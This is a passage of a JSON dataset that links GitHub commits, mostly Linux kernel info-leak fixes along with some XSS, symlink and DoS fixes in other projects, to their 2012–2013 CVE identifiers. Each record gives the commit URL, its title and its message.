    "body": "The production/stage public candlepin certificate is now packaged in theRPM. This is flagged as a config file but *without* noreplace, so anydeployment using their own upstream cert (we don't think there are any)will have to restore it from the rpmsave file that results after acandlepin rpm upgrade. This was done because we expect this to be thedesired behavior, there is no known usecase for using your ownupstream cert at this time.",
    "cveIds": [
      "CVE-2012-6119"
    ],
    "cveIdsCount": 1
  },
  "be6e1ac3eaf18fdfbdf9fd3f87607de26ef7043ed9482b134a33ce0a91b7d44c": {
    "url": "https://github.com/roundcube/roundcubemail/commit/74cd0a9b62f11bc07c5a1d3ba0098b54883eb0ba",
    "title": "- Fix XSS vulnerability in vbscript: and data:text links handling (#1…",
    "body": "…488850)",
    "cveIds": [
      "CVE-2012-6121"
    ],
    "cveIdsCount": 1
  },
  "0b7ab5df96b889d1814f8ac29fc354b7a645623a708a7ff34560ca7dfa8c5fc8": {
    "url": "https://github.com/torvalds/linux/commit/ecd7918745234e423dd87fcc0c077da557909720",
    "title": "xfrm_user: ensure user supplied esn replay window is valid",
    "body": "The current code fails to ensure that the netlink message actuallycontains as many bytes as the header indicates. If a user creates a newstate or updates an existing one but does not supply the bytes for thewhole ESN replay window, the kernel copies random heap bytes into thereplay bitmap, the ones happen to follow the XFRMA_REPLAY_ESN_VALnetlink attribute. This leads to following issues:1. The replay window has random bits set confusing the replay handling code later on.2. A malicious user could use this flaw to leak up to ~3.5kB of heap memory when she has access to the XFRM netlink interface (requires CAP_NET_ADMIN).Known users of the ESN replay window are strongSwan and Steffen'siproute2 patch (<http://patchwork.ozlabs.org/patch/85962/>). The latteruses the interface with a bitmap supplied while the former does not.strongSwan is therefore prone to run into issue 1.To fix both issues without breaking existing userland allow using theXFRMA_REPLAY_ESN_VAL netlink attribute with either an empty bitmap or afully specified one. For the former case we initialize the in-kernelbitmap with zero, for the latter we copy the user supplied bitmap. Forstate updates the full bitmap must be supplied.To prevent overflows in the bitmap length calculation the maximum sizeof bmp_len is limited to 128 by this patch -- resulting in a maximumreplay window of 4096 packets. This should be sufficient for all reallife scenarios (RFC 4303 recommends a default replay window size of 64).Cc: Steffen Klassert <steffen.klassert@secunet.com>Cc: Martin Willi <martin@revosec.ch>Cc: Ben Hutchings <bhutchings@solarflare.com>Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6536"
    ],
    "cveIdsCount": 1
  },
  "1dd516698c683cd16c53d25f40b7e80481d6f8e0d2928311d8e50ca99f9d310b": {
    "url": "https://github.com/torvalds/linux/commit/f778a636713a435d3a922c60b1622a91136560c1",
    "title": "xfrm_user: fix info leak in copy_to_user_state()",
    "body": "The memory reserved to dump the xfrm state includes the padding bytes ofstruct xfrm_usersa_info added by the compiler for alignment (7 foramd64, 3 for i386). Add an explicit memset(0) before filling the bufferto avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Acked-by: Steffen Klassert <steffen.klassert@secunet.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6537"
    ],
    "cveIdsCount": 1
  },
  "b60d02e23cf1dd0ee712967c257c2c37135d45527632b351c7125da934f4596a": {
    "url": "https://github.com/torvalds/linux/commit/7b789836f434c87168eab067cfbed1ec4783dffd",
    "title": "xfrm_user: fix info leak in copy_to_user_policy()",
    "body": "The memory reserved to dump the xfrm policy includes multiple paddingbytes added by the compiler for alignment (padding bytes in structxfrm_selector and struct xfrm_userpolicy_info). Add an explicitmemset(0) before filling the buffer to avoid the heap info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Acked-by: Steffen Klassert <steffen.klassert@secunet.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6537"
    ],
    "cveIdsCount": 1
  },
  "e240215a1222c22764f2c35d2e25905b0a4a37997dc7b45031d7c681e90fbcbc": {
    "url": "https://github.com/torvalds/linux/commit/1f86840f897717f86d523a13e99a447e6a5d2fa5",
    "title": "xfrm_user: fix info leak in copy_to_user_tmpl()",
    "body": "The memory used for the template copy is a local stack variable. Asstruct xfrm_user_tmpl contains multiple holes added by the compiler foralignment, not initializing the memory will lead to leaking stack bytesto userland. Add an explicit memset(0) to avoid the info leak.Initial version of the patch by Brad Spengler.Cc: Brad Spengler <spender@grsecurity.net>Signed-off-by: Mathias Krause <minipli@googlemail.com>Acked-by: Steffen Klassert <steffen.klassert@secunet.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6537"
    ],
    "cveIdsCount": 1
  },
  "e55d309615592f2264c80117e11de8250a63194aba441c9bc1daf78f6860c5f7": {
    "url": "https://github.com/torvalds/linux/commit/4c87308bdea31a7b4828a51f6156e6f721a1fcc9",
    "title": "xfrm_user: fix info leak in copy_to_user_auth()",
    "body": "copy_to_user_auth() fails to initialize the remainder of alg_name andtherefore discloses up to 54 bytes of heap memory via netlink touserland.Use strncpy() instead of strcpy() to fill the trailing bytes of alg_namewith null bytes.Signed-off-by: Mathias Krause <minipli@googlemail.com>Acked-by: Steffen Klassert <steffen.klassert@secunet.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6538"
    ],
    "cveIdsCount": 1
  },
  "506c720f85ae0b67367e0c43ad5fafa69a239ce15b273ef0f378e784f504ff7c": {
    "url": "https://github.com/torvalds/linux/commit/43da5f2e0d0c69ded3d51907d9552310a6b545e8",
    "title": "net: fix info leak in compat dev_ifconf()",
    "body": "The implementation of dev_ifconf() for the compat ioctl interface usesan intermediate ifc structure allocated in userland for the duration ofthe syscall. Though, it fails to initialize the padding bytes insertedfor alignment and that for leaks four bytes of kernel stack. Add anexplicit memset(0) before filling the structure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6539"
    ],
    "cveIdsCount": 1
  },
  "c5d205406c612940bd891c841cca73d6d742f976a96fd561e4c4c9372893d31f": {
    "url": "https://github.com/torvalds/linux/commit/2d8a041b7bfe1097af21441cb77d6af95f4f4680",
    "title": "ipvs: fix info leak in getsockopt(IP_VS_SO_GET_TIMEOUT)",
    "body": "If at least one of CONFIG_IP_VS_PROTO_TCP or CONFIG_IP_VS_PROTO_UDP isnot set, __ip_vs_get_timeouts() does not fully initialize the structurethat gets copied to userland and that for leaks up to 12 bytes of kernelstack. Add an explicit memset(0) before passing the structure to__ip_vs_get_timeouts() to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Wensong Zhang <wensong@linux-vs.org>Cc: Simon Horman <horms@verge.net.au>Cc: Julian Anastasov <ja@ssi.bg>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6540"
    ],
    "cveIdsCount": 1
  },
  "339cce86390707e7fb17c228169b85f9e33e28fdda730f6bd7ad70ba8f25813e": {
    "url": "https://github.com/torvalds/linux/commit/7b07f8eb75aa3097cdfd4f6eac3da49db787381d",
    "title": "dccp: fix info leak via getsockopt(DCCP_SOCKOPT_CCID_TX_INFO)",
    "body": "The CCID3 code fails to initialize the trailing padding bytes of structtfrc_tx_info added for alignment on 64 bit architectures. It that forpotentially leaks four bytes kernel stack via the getsockopt() syscall.Add an explicit memset(0) before filling the structure to avoid theinfo leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6541"
    ],
    "cveIdsCount": 1
  },
  "5a6b325a7a0db6837ac9dc6d2803fb3c023509ea7f539b2ce85e89fd76dbca01": {
    "url": "https://github.com/torvalds/linux/commit/3592aaeb80290bda0f2cf0b5456c97bfc638b192",
    "title": "llc: fix info leak via getsockname()",
    "body": "The LLC code wrongly returns 0, i.e. \"success\", when the socket iszapped. Together with the uninitialized uaddrlen pointer argument fromsys_getsockname this leads to an arbitrary memory leak of up to 128bytes kernel stack via the getsockname() syscall.Return an error instead when the socket is zapped to prevent the infoleak. Also remove the unnecessary memset(0). We don't directly write tothe memory pointed by uaddr but memcpy() a local structure at the end ofthe function that is properly initialized.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6542"
    ],
    "cveIdsCount": 1
  },
  "b17eb63cfceca3e7ebb6171b5c6e3a717ea0bee68714ad7ef3d528152d16d53f": {
    "url": "https://github.com/torvalds/linux/commit/04d4fbca1017c11381e7d82acea21dd741e748bc",
    "title": "l2tp: fix info leak via getsockname()",
    "body": "The L2TP code for IPv6 fails to initialize the l2tp_unused member ofstruct sockaddr_l2tpip6 and that for leaks two bytes kernel stack viathe getsockname() syscall. Initialize l2tp_unused with 0 to avoid theinfo leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: James Chapman <jchapman@katalix.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6543"
    ],
    "cveIdsCount": 1
  },
  "997c81f9501fe803fa0ce8c461f46672f53307a1b910a4bf0c0d46b22fd3bd68": {
    "url": "https://github.com/torvalds/linux/commit/e15ca9a0ef9a86f0477530b0f44a725d67f889ee",
    "title": "Bluetooth: HCI - Fix info leak in getsockopt(HCI_FILTER)",
    "body": "The HCI code fails to initialize the two padding bytes of structhci_ufilter before copying it to userland -- that for leaking twobytes kernel stack. Add an explicit memset(0) before filling thestructure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6544"
    ],
    "cveIdsCount": 1
  },
  "82b5760943919d82993d08409331305df3fcb8427a9081fb092b7aff8dce1847": {
    "url": "https://github.com/torvalds/linux/commit/792039c73cf176c8e39a6e8beef2c94ff46522ed",
    "title": "Bluetooth: L2CAP - Fix info leak via getsockname()",
    "body": "The L2CAP code fails to initialize the l2_bdaddr_type member of structsockaddr_l2 and the padding byte added for alignment. It that for leakstwo bytes kernel stack via the getsockname() syscall. Add an explicitmemset(0) before filling the structure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6544"
    ],
    "cveIdsCount": 1
  },
  "b1f4749d06c2286a7ddb63e90fe45b07ceabbc946d20bab5918139b7708f248f": {
    "url": "https://github.com/torvalds/linux/commit/3f68ba07b1da811bf383b4b701b129bfcb2e4988",
    "title": "Bluetooth: HCI - Fix info leak via getsockname()",
    "body": "The HCI code fails to initialize the hci_channel member of structsockaddr_hci and that for leaks two bytes kernel stack via thegetsockname() syscall. Initialize hci_channel with 0 to avoid theinfo leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6544"
    ],
    "cveIdsCount": 1
  },
  "91c1267f855f165ce4d2ca06ccd133de73e9495f87a3b55aff602e67e452396c": {
    "url": "https://github.com/torvalds/linux/commit/f9432c5ec8b1e9a09b9b0e5569e3c73db8de432a",
    "title": "Bluetooth: RFCOMM - Fix info leak in ioctl(RFCOMMGETDEVLIST)",
    "body": "The RFCOMM code fails to initialize the two padding bytes of structrfcomm_dev_list_req inserted for alignment before copying it touserland. Additionally there are two padding bytes in each instance ofstruct rfcomm_dev_info. The ioctl() that for disclosures two bytes plusdev_num times two bytes uninitialized kernel heap memory.Allocate the memory using kzalloc() to fix this issue.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6545"
    ],
    "cveIdsCount": 1
  },
  "100afa63bff94006d21ffafc98ae9ffc51f200f00413c0e5093b0f7286af5f48": {
    "url": "https://github.com/torvalds/linux/commit/9ad2de43f1aee7e7274a4e0d41465489299e344b",
    "title": "Bluetooth: RFCOMM - Fix info leak in getsockopt(BT_SECURITY)",
    "body": "The RFCOMM code fails to initialize the key_size member of structbt_security before copying it to userland -- that for leaking onebyte kernel stack. Initialize key_size with 0 to avoid the infoleak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6545"
    ],
    "cveIdsCount": 1
  },
  "521741b716f218a3b8ac737a61421dfd1223100ead2a3f53ccd7396842ca0e0b": {
    "url": "https://github.com/torvalds/linux/commit/9344a972961d1a6d2c04d9008b13617bcb6ec2ef",
    "title": "Bluetooth: RFCOMM - Fix info leak via getsockname()",
    "body": "The RFCOMM code fails to initialize the trailing padding byte of structsockaddr_rc added for alignment. It that for leaks one byte kernel stackvia the getsockname() syscall. Add an explicit memset(0) before fillingthe structure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Cc: Marcel Holtmann <marcel@holtmann.org>Cc: Gustavo Padovan <gustavo@padovan.org>Cc: Johan Hedberg <johan.hedberg@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6545"
    ],
    "cveIdsCount": 1
  },
  "4f61fd96e6292d803f6658a0df9e0b8405c266ea34c22b41b236884cfa1b546b": {
    "url": "https://github.com/torvalds/linux/commit/3c0c5cfdcd4d69ffc4b9c0907cec99039f30a50a",
    "title": "atm: fix info leak via getsockname()",
    "body": "The ATM code fails to initialize the two padding bytes of structsockaddr_atmpvc inserted for alignment. Add an explicit memset(0)before filling the structure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6546"
    ],
    "cveIdsCount": 1
  },
  "bc3020ea77d532d0ce07c756764375345af499905278dd2003b1ca94185abc19": {
    "url": "https://github.com/torvalds/linux/commit/e862f1a9b7df4e8196ebec45ac62295138aa3fc2",
    "title": "atm: fix info leak in getsockopt(SO_ATMPVC)",
    "body": "The ATM code fails to initialize the two padding bytes of structsockaddr_atmpvc inserted for alignment. Add an explicit memset(0)before filling the structure to avoid the info leak.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6546"
    ],
    "cveIdsCount": 1
  },
  "c7105b6aa12e514943b97177b84e45cb4672f97cea16a5db37734f0f5459e941": {
    "url": "https://github.com/torvalds/linux/commit/a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc",
    "title": "net/tun: fix ioctl() based info leaks",
    "body": "The tun module leaks up to 36 bytes of memory by not fully initializinga structure located on the stack that gets copied to user memory by theTUNGETIFF and SIOCGIFHWADDR ioctl()s.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6547"
    ],
    "cveIdsCount": 1
  },
  "89114d79e1db283740686765ffd4bc7640d0d9007f69e4891b066f0b23f19ca5": {
    "url": "https://github.com/torvalds/linux/commit/0143fc5e9f6f5aad4764801015bc8d4b4a278200",
    "title": "udf: avoid info leak on export",
    "body": "For type 0x51 the udf.parent_partref member in struct fid gets copieduninitialized to userland. Fix this by initializing it to 0.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2012-6548"
    ],
    "cveIdsCount": 1
  },
  "b2beabe16f2518953aaccd2c5fc56fed455a2a8342634893193d7f84363ad9b6": {
    "url": "https://github.com/torvalds/linux/commit/fe685aabf7c8c9f138e5ea900954d295bf229175",
    "title": "isofs: avoid info leak on export",
    "body": "For type 1 the parent_offset member in struct isofs_fid gets copieduninitialized to userland. Fix this by initializing it to 0.Signed-off-by: Mathias Krause <minipli@googlemail.com>Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2012-6549"
    ],
    "cveIdsCount": 1
  },
  "c9587f1667b8fb4ec21a50158c86e9f38e6e3e3c378d91d4782da017edc5999e": {
    "url": "https://github.com/hercules-team/augeas/commit/16387744",
    "title": "Prevent symlink attacks via .augnew during saving",
    "body": "Instead of saving into a predictable PATH.augnew file, save into a securelycreated PATH.augnew.XXXXXX* src/transform.c (transform_save): write changes to a temporary file in the same directory as the destination (either the file's canonical path or the path of .augnew), before renaming* src/transform.c (transfer_file_attrs): use fchown, fchmod etc. on the same file handles to ensure consistent permission changes* bootstrap: add mkstemp gnulib module* tests/ test-put-symlink-augnew.sh: test symlink attack when writing .augnew test-put-symlink-augsave.sh: test symlink attack when writing .augsave test-put-symlink-augtemp.sh: test symlink attack via temp .augnew test-put-symlink.sh: also test file modificationFixes BZ 772257",
    "cveIds": [
      "CVE-2012-6607"
    ],
    "cveIdsCount": 1
  },
  "2d1ced2d3c5507713937159d29b846c08028184c8bf9e5f795504222a81f5f82": {
    "url": "https://github.com/torvalds/linux/commit/fdf5af0daf8019cec2396cdef8fb042d80fe71fa",
    "title": "tcp: drop SYN+FIN messages",
    "body": "Denys Fedoryshchenko reported that SYN+FIN attacks were bringing hislinux machines to their limits.Dont call conn_request() if the TCP flags includes SYN flagReported-by: Denys Fedoryshchenko <denys@visp.net.lb>Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6638"
    ],
    "cveIdsCount": 1
  },
  "4db773e9397303d9e14e58d78e98b7cec62a19dc58b7a9695b5e1b643c94f1a1": {
    "url": "https://github.com/torvalds/linux/commit/6f7b0a2a5c0fb03be7c25bd1745baa50582348ef",
    "title": "futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()",
    "body": "If uaddr == uaddr2, then we have broken the rule of only requeueingfrom a non-pi futex to a pi futex with this call. If we attempt this,as the trinity test suite manages to do, we miss early wakeups asq.key is equal to key2 (because they are the same uaddr). We will thenattempt to dereference the pi_mutex (which would exist had the futex_qbeen properly requeued to a pi futex) and trigger a NULL pointerdereference.Signed-off-by: Darren Hart <dvhart@linux.intel.com>Cc: Dave Jones <davej@redhat.com>Cc: stable@vger.kernel.orgLink: http://lkml.kernel.org/r/ad82bfe7f7d130247fbe2b5b4275654807774227.1342809673.git.dvhart@linux.intel.comSigned-off-by: Thomas Gleixner <tglx@linutronix.de>",
    "cveIds": [
      "CVE-2012-6647"
    ],
    "cveIdsCount": 1
  },
  "894e1f3c3ab7b00c4f01fea43a2c41d350e87ddcde9b7df75d84f68378fc4a9d": {
    "url": "https://github.com/torvalds/linux/commit/3e10986d1d698140747fcfc2761ec9cb64c1d582",
    "title": "net: guard tcp_set_keepalive() to tcp sockets",
    "body": "Its possible to use RAW sockets to get a crash intcp_set_keepalive() / sk_reset_timer()Fix is to make sure socket is a SOCK_STREAM one.Reported-by: Dave Jones <davej@redhat.com>Signed-off-by: Eric Dumazet <edumazet@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6657"
    ],
    "cveIdsCount": 1
  },
  "4244a74c28b764ef6fa1ae412f479c0001f339e5e648c89b4fac35be6351730f": {
    "url": "https://github.com/jquery/jquery-ui/commit/f2854408cce7e4b7fc6bf8676761904af9c96bde",
    "title": "Tooltip: Escape the title attribute so that it's treated as text and …",
    "body": "…not HTML. Fixes #8861 - Tooltip: XSS vulnerability in default content.",
    "cveIds": [
      "CVE-2012-6662"
    ],
    "cveIdsCount": 1
  },
  "1123c3f68dc59d2c845ed10b3b09ff9afe1b165c90eb3b6d2924f4baf8206cbf": {
    "url": "https://github.com/jquery/jquery-ui/commit/5fee6fd5000072ff32f2d65b6451f39af9e0e39e",
    "title": "Autocomplete demo: Combobox: Encode search term inside tooltips. Fixe…",
    "body": "…s #8859 - Autocomplete: XSS in combobox demo.",
    "cveIds": [
      "CVE-2012-6662"
    ],
    "cveIdsCount": 1
  },
  "7dbf7a1c6265bdf6b934f8a47270010b28aab6afe2b127a9ff74f495be704df4": {
    "url": "https://github.com/inspircd/inspircd/commit/ed28c1ba666b39581adb860bf51cdde43c84cc89",
    "title": "Fixed out of bounds memory access from malformed DNS queries that hav…",
    "body": "…e an invalid length label. Introduced in a6a07de.",
    "cveIds": [
      "CVE-2012-6696"
    ],
    "cveIdsCount": 1
  },
  "4c12fc491e71fe1b0830b8569d39184d6c7584846b775757d341a4ae0872be1b": {
    "url": "https://github.com/torvalds/linux/commit/82981930125abfd39d7c8378a9cfdf5e1be2002b",
    "title": "net: cleanups in sock_setsockopt()",
    "body": "Use min_t()/max_t() macros, reformat two comments, use !!test_bit() tomatch !!sock_flag()Signed-off-by: Eric Dumazet <edumazet@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-6704"
    ],
    "cveIdsCount": 1
  },
  "49cdb1193ccff1a08b02f42bda4733e0ed35f892d6626308fd65f0a566ed9ebb": {
    "url": "https://github.com/jquery/jquery/commit/05531fc4080ae24070930d15ae0cea7ae056457d",
    "title": "Adjust jQuery('html') detection to only match when html starts with '…",
    "body": "…<' (not counting space characters). Fixes #11290.",
    "cveIds": [
      "CVE-2012-6708"
    ],
    "cveIdsCount": 1
  },
  "1f1dd807ff6fcbea7dfe2844442d0c763fed5c4748df79e0d542107b074a96ff": {
    "url": "https://github.com/torvalds/linux/commit/2da424b0773cea3db47e1e81db71eeebde8269d4",
    "title": "iwlwifi: Sanity check for sta_id",
    "body": "On my testing, I saw some strange behavior[ 421.739708] iwlwifi 0000:01:00.0: ACTIVATE a non DRIVER active station id 148 addr 00:00:00:00:00:00[ 421.739719] iwlwifi 0000:01:00.0: iwl_sta_ucode_activate Added STA id 148 addr 00:00:00:00:00:00 to uCodenot sure how it happen, but adding the sanity check to prevent memorycorruptionSigned-off-by: Wey-Yi Guy <wey-yi.w.guy@intel.com>Signed-off-by: John W. Linville <linville@tuxdriver.com>",
    "cveIds": [
      "CVE-2012-6712"
    ],
    "cveIdsCount": 1
  },
  "682e7412d82a374a8b0be9979a371b6c352709d36798544e487b6ea214e6439f": {
    "url": "https://github.com/antirez/redis/commit/697af434fbeb2e3ba2ba9687cd283ed1a2734fa5",
    "title": "initial changes needed to turn the current VM code into a cache syste…",
    "body": "…m. Tons of work to do still.",
    "cveIds": [
      "CVE-2013-0178"
    ],
    "cveIdsCount": 1
  },
  "4b61207e7c82901e3d1a18476aef4b93cd92050821fb2e1cbbe204d0a944ae9b": {
    "url": "https://github.com/rack/rack/commit/548b9af2dc0059f4c0c19728624448d84de450ff",
    "title": "multipart/parser: avoid unbounded #gets method",
    "body": "Malicious clients may send excessively long linesto trigger out-of-memory errors in a Rack web server.",
    "cveIds": [
      "CVE-2013-0183"
    ],
    "cveIdsCount": 1
  },
  "4f597f7751ec95cd4c44380fd0df717bf55931d18c9d20a40bed20e5c2a9d030": {
    "url": "https://github.com/openid/ruby-openid/commit/a3693cef06049563f5b4e4824f4d3211288508ed",
    "title": "Merge pull request #43 from nov/against_dos",
    "body": "limit fetching file size & disable XML entity expansion",
    "cveIds": [
      "CVE-2013-1812"
    ],
    "cveIdsCount": 1
  },
  "8a7e823042b7330799adb3a05058bb8d14cd2b959dbc814657a1dcb5e9ffe081": {
    "url": "https://github.com/torvalds/linux/commit/eb178619f930fa2ba2348de332a1ff1c66a31424",
    "title": "xfs: fix _xfs_buf_find oops on blocks beyond the filesystem end",
    "body": "When _xfs_buf_find is passed an out of range address, it will failto find a relevant struct xfs_perag and oops with a nulldereference. This can happen when trying to walk a filesystem with ametadata inode that has a partially corrupted extent map (i.e. theblock number returned is corrupt, but is otherwise intact) and wetry to read from the corrupted block address.In this case, just fail the lookup. If it is readahead being issued,it will simply not be done, but if it is real read that fails wewill get an error being reported. Ideally this case should resultin an EFSCORRUPTED error being reported, but we cannot return anerror through xfs_buf_read() or xfs_buf_get() so this lookup failuremay result in ENOMEM or EIO errors being reported instead.Signed-off-by: Dave Chinner <dchinner@redhat.com>Reviewed-by: Brian Foster <bfoster@redhat.com>Reviewed-by: Ben Myers <bpm@sgi.com>Signed-off-by: Ben Myers <bpm@sgi.com>",
    "cveIds": [
      "CVE-2013-1819"
    ],
    "cveIdsCount": 1
  },
  "9a2d5b52ab68b761e5c7a778595b26070c02a3c1fcabd42bec14f3a61616640e": {
    "url": "https://github.com/torvalds/linux/commit/726bc6b092da4c093eb74d13c07184b18c1af0f1",
    "title": "net/sctp: Validate parameter size for SCTP_GET_ASSOC_STATS",
    "body": "Building sctp may fail with:In function ‘copy_from_user’, inlined from ‘sctp_getsockopt_assoc_stats’ at net/sctp/socket.c:5656:20:arch/x86/include/asm/uaccess_32.h:211:26: error: call to ‘copy_from_user_overflow’ declared with attribute error: copy_from_user() buffer size is not provably correctif built with W=1 due to a missing parameter size validationbefore the call to copy_from_user.Signed-off-by: Guenter Roeck <linux@roeck-us.net>Acked-by: Vlad Yasevich <vyasevich@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-1828"
    ],
    "cveIdsCount": 1
  },
  "8257c9bbf5e5f66d009ca4d03b1dda5bc5a0c009be3f0549128f96da8079b3c1": {
    "url": "https://github.com/torvalds/linux/commit/8d0c2d10dd72c5292eda7a06231056a4c972e4cc",
    "title": "ext3: Fix format string issues",
    "body": "ext3_msg() takes the printk prefix as the second parameter and theformat string as the third parameter. Two callers of ext3_msg omit theprefix and pass the format string as the second parameter and the firstparameter to the format string as the third parameter. In both casesthis string comes from an arbitrary source. Which means the string maycontain format string characters, which willlead to undefined and potentially harmful behavior.The issue was introduced in commit 4cf46b6(\"ext3: Unify log messagesin ext3\") and is fixed by this patch.CC: stable@vger.kernel.orgSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2013-1848"
    ],
    "cveIdsCount": 1
  },
  "c750710cfb77ab972149e59904caa4b027ea7f9753d5b3e61bb7cd5ff98a698a": {
    "url": "https://github.com/torvalds/linux/commit/e66eded8309ebf679d3d3c1f5820d1f2ca332c71",
    "title": "userns: Don't allow CLONE_NEWUSER | CLONE_FS",
    "body": "Don't allowing sharing the root directory with processes in adifferent user namespace. There doesn't seem to be any point, and toallow it would require the overhead of putting a user namespacereference in fs_struct (for permission checks) and incrementing thatreference count on practically every call to fork.So just perform the inexpensive test of forbidding sharing fs_structacrosss processes in different user namespaces. We already disallowother forms of threading when unsharing a user namespace so thisshould be no real burden in practice.This updates setns, clone, and unshare to disallow multiple usernamespaces sharing an fs_struct.Cc: stable@vger.kernel.orgSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-1858"
    ],
    "cveIdsCount": 1
  },
  "bc8693150e12beaacff953f0ca533131b24e7711be5854a742dd8ab8bd46d529": {
    "url": "https://github.com/torvalds/linux/commit/c0f5ecee4e741667b2493c742b60b6218d40b3aa",
    "title": "USB: cdc-wdm: fix buffer overflow",
    "body": "The buffer for responses must not overflow.If this would happen, set a flag, drop the data and returnan error after user space has read all remaining data.Signed-off-by: Oliver Neukum <oliver@neukum.org>CC: stable@kernel.orgSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2013-1860"
    ],
    "cveIdsCount": 1
  },
  "c6c04de7e5ee6c95b4bd04d45db93199cd5e68c233e426c44d5a31a7a343fb85": {
    "url": "https://github.com/mantisbt/mantisbt/commit/d16988c3ca232a7",
    "title": "Fix filter api issue with 'any condition' and text search",
    "body": "A filter combining some criteria and a text search with 'any condition'results in a cartesian product, which has the potential to bring downthe site as the RDBMS eats up all available resources.The root cause of this behavior is joining the bug_text table with afrom clause and setting the join's criteria in the query's where clause,without taking consideration the operator's precedence (AND/OR).This commit resolves the problem by using a JOIN clause instead, whichmakes the query cleaner.Fixes #15573",
    "cveIds": [
      "CVE-2013-1883"
    ],
    "cveIdsCount": 1
  },
  "e2105dc3d7e7e1cafdd8be09417834cc0cfc687a944d04f1fa3c838f72215f25": {
    "url": "https://github.com/torvalds/linux/commit/12176503366885edd542389eed3aaf94be163fdb",
    "title": "fs/compat_ioctl.c: VIDEO_SET_SPU_PALETTE missing error check",
    "body": "The compat ioctl for VIDEO_SET_SPU_PALETTE was missing an error checkwhile converting ioctl arguments. This could lead to leaking kernelstack contents into userspace.Patch extracted from existing fix in grsecurity.Signed-off-by: Kees Cook <keescook@chromium.org>Cc: David Miller <davem@davemloft.net>Cc: Brad Spengler <spender@grsecurity.net>Cc: PaX Team <pageexec@freemail.hu>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-1928"
    ],
    "cveIdsCount": 1
  },
